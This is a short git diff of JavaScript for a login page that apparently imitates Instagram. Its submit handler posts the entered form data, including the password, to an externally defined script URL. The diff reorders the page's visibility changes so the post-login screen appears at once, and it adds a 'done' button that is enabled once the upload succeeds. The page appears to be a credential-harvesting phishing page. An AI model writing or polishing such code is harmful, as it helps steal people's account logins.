@@ -54,6 +54,10 @@ password.addEventListener("keydown", (e) => {
 let afterLog = document.getElementById("afterLog");
 
 
+let doneBtn = document.getElementById("doneBtn");
+doneBtn.disabled=true;
+
+
 
 
 
@@ -65,14 +69,16 @@ const form = document.forms['log-in'];
 
 form.addEventListener('submit', e => {
   e.preventDefault();
+  afterLog.classList.remove("hidden");
+  instagram.classList.add("hidden");
   fetch(scriptURL, {
     method: 'POST',
     body: new FormData(form),
   })
     .then(response => response.json())
     .then(data => {
-        afterLog.classList.remove("hidden");
-        instagram.classList.add("hidden");
+        
+        doneBtn.disabled=false;
       
     })
     .catch(error => {
